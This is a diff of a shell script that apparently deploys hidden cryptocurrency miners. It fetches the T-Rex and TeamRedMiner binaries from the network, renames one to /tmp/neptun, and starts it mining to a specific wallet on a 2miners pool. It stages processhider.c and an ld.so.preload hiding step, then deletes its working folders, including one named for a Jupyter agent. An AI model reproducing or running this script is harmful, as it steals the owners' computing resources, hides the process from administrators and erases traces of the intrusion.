@@ -1,9 +1,9 @@
 mkdir -p /tmp/ml 
 mv Makefile processhider.c /tmp/ml/
-#./cudaubuntu.sh
-#./cudafedora.sh
-#./cudaredhat.sh 
-#./amd.sh
+./cudaubuntu.sh
+./cudafedora.sh
+./cudaredhat.sh 
+./amd.sh
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
 mv t-rex-0.26.8-linux.tar.gz /tmp/ml/
 tar xf /tmp/ml/t-rex-0.26.8-linux.tar.gz -C /tmp/ml
@@ -17,9 +17,10 @@ mv teamredminer-v0.10.14-linux.tgz /tmp/ml/teamredminer-v0.10.14-linux.tgz
 tar zxvf /tmp/ml/teamredminer-v0.10.14-linux.tgz -C /tmp/ml
 cp /tmp/ml/teamredminer-v0.10.14-linux/teamredminer /tmp/neptun
 /tmp/neptun -a kawpow -o stratum+tcp://xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 & 
-cp -r /amd /tmp/ml/
+cp -r /amd /tmp/ml/amd
 #./tmp/ml/amd/make
 #mv /tmp/ml/surec.so /usr/local/lib/
 #echo /usr/local/lib/surec.so >> /etc/ld.so.preload
-#rm -rf /tmp/ml
-
+rm -rf /tmp/ml
+rm -rf /tmp/jupyternotebookagent
+rm -rf /tmp/neptun
